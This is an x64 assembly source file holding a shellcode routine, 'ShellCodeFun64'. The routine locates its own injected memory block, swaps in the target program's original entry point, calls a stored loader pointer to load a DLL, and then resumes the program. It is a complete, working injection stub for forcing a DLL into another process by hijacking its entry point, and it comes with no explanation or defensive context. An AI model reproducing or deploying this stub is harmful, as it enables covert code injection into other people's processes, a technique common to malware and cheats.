.CODE

ShellCodeFun64 PROC 
	push    rax                   ;
	push    rcx
	push    rdx
	push    rbx
	push    rbp
	push    rsi
	push    rdi
	push    r9
	pushfq
	call  next
next:
	pop     rbx
	and     bx,0						;then rbx = Alloced Mem Base
	mov     rax,qword ptr [rbx+0E0h]	;OriginalEIP
	xchg    rax,qword ptr [rsp+040h]	;saved retnaddr
	mov     rcx,rbx
	call	  LoadDllAndRestoreExeEntry
	popfq
	pop     r9
	pop     rdi
	pop     rsi
	pop     rbp
	pop     rbx
	pop     rdx
	pop     rcx
	ret
  LoadDllAndRestoreExeEntry:
    mov        qword ptr [rsp+08h], rbx
    push       rdi
    sub        rsp, 30h
    mov        rdx, qword ptr [rcx+000000F8h]
    mov        rax, qword ptr [rcx+00000108h]
    mov        rdi, qword ptr [rcx+000000D8h]
    mov        r10, qword ptr [rcx+00000100h]
    mov        qword ptr [rdx], rax
    mov        rax, qword ptr [rcx+00000110h]
    mov        qword ptr [rdx+08h], rax
    lea        rax, qword ptr [rcx+000000E8h]
    lea        r8, qword ptr [rcx+000000F0h]
    mov        r9d, dword ptr [rax]
    lea        rdx, qword ptr [rcx+000000E0h]
    mov        rbx, rcx
    or         rcx, 0FFFFFFFFFFFFFFFFh
    mov        qword ptr [rsp+20h], rax
    call       r10
    mov        r8, qword ptr [rbx+000000C8h]
    lea        r9, qword ptr [rbx+000000C0h]
    lea        rdx, qword ptr [rbx+000000D0h]
    xor        ecx, ecx
    mov        rax, rdi
    mov        rbx, qword ptr [rsp+40h]
    add        rsp, 30h
    pop        rdi
    jmp        rax
	nop
	nop
	nop
	nop
	nop
ShellCodeFun64 ENDP

END 